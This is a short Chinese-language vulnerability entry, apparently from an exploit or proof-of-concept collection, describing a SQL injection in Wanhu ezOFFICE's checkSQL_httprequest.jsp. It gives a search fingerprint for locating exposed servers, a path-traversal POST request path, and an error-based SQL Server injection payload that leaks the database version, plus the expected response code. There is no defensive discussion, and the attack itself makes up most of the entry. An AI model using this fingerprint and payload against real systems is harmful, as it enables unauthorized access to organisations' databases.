# 万户ezOFFICEcheckSQL_httprequest.jsp存在SQL注入漏洞

万户 ｜ SQL注入 ｜ —
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1`

**Payload**
```
selectSQL=select distinct convert(int,@@VERSION)&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--
```
- **响应特征**：200